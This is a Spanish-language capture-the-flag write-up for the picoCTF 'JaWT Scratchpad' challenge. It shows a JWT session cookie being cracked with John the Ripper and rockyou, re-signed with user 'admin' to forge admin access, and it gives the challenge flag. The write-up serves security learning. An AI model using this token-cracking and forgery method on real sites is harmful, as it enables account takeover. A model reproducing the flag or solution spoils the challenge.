## Description

Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/58210/` or http://jupiter.challenges.picoctf.org:58210
#### hints
- What is that cookie?
- Have you heard of JWT?
## Solución

Entramos a la página:
![[Pasted image 20240923113258.png]]

y nos registramos con cualquier nombre. Después vamos al editor de cookies y nos traemos el valor de la cookie:
![[Pasted image 20240923113425.png]]

Posteriormente esa clave la pegamos en: [jwt](https://jwt.io/introduction)
![[Pasted image 20240923113620.png]]

Luego en kali procedemos a:
```shell
┌──(kali㉿kali)-[~]
└─$ nano hola      
                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ cat hola      
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiY2FybG9zIn0.ibA8ZjnNXLYfuOIQWln6-CmmzUhw-bsu3BivkwnNYDk
                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ cd /usr/share/wordlists
                                                                                                                             
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ sudo gzip -d rockyou.txt.gz              
[sudo] password for kali: 
                                                                                                                             
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ ls
amass  dirbuster   fasttrack.txt  john.lst  metasploit  rockyou.txt  wfuzz
dirb   dnsmap.txt  fern-wifi      legion    nmap.lst    sqlmap.txt   wifite.txt
                                                                                                                             
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ head rockyou.txt        
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
                                                                                                                             
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ wc -l rockyou.txt 
14344392 rockyou.txt
                                                                                                                             
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ cd                     
                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ cat ho  
cat: ho: No such file or directory
                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ cat hola
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiY2FybG9zIn0.ibA8ZjnNXLYfuOIQWln6-CmmzUhw-bsu3BivkwnNYDk
                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ john hola -w=/usr/share/wordlists/rockyou.txt 
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:02 DONE (2024-09-23 13:29) 0.3412g/s 2524Kp/s 2524Kc/s 2524KC/s iloverob4live345..ilovepatri
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ 


```

Y la palabra `"ilovepico"` que encontró la herramienta de ``john`` la ponemos en _Verify Signature_ y cambiamos el valos del _user_ a ``admin``. 
![[Pasted image 20240923113956.png]]

Copiamos la parte de la izquierda y la ponemos en el valor de la cookie :
![[Pasted image 20240923114042.png]]

Guardamos y recargamos la página:
![[Pasted image 20240923114101.png]]
## Bandera
```css
flag: picoCTF{jawt_was_just_what_you_thought_44c752f5}
```
## Notas Adicionales

# comandos utilizados

## Referencias
- [jwt](https://jwt.io/introduction)